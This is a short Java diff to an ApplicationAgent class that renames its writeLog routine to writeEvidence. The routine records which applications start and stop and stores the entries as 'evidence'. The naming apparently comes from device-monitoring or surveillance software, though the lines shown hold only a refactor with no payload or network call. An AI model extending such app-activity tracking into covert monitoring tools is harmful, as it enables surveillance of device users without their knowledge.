@@ -106,10 +106,10 @@ public final class ApplicationAgent extends Agent implements
         //#endif
 
         if (stoppedName != null) {
-            writeLog(stoppedName, "STOP ", stoppedMod);
+            writeEvidence(stoppedName, "STOP ", stoppedMod);
         }
 
-        writeLog(startedName, "START", startedMod);
+        writeEvidence(startedName, "START", startedMod);
     }
 
     /*
@@ -166,7 +166,7 @@ public final class ApplicationAgent extends Agent implements
         return false;
     }
 
-    private synchronized void writeLog(final String appName,
+    private synchronized void writeEvidence(final String appName,
             final String condition, final String mod) {
 
         //#ifdef DBC
@@ -183,9 +183,9 @@ public final class ApplicationAgent extends Agent implements
         items.addElement(WChar.getBytes(mod, true));
         items.addElement(Utils.intToByteArray(LOG_DELIMITER));
 
-        log.createLog(null);
-        log.writeLogs(items);
-        log.close();
+        evidence.createEvidence(null);
+        evidence.writeEvidences(items);
+        evidence.close();
 
     }
 
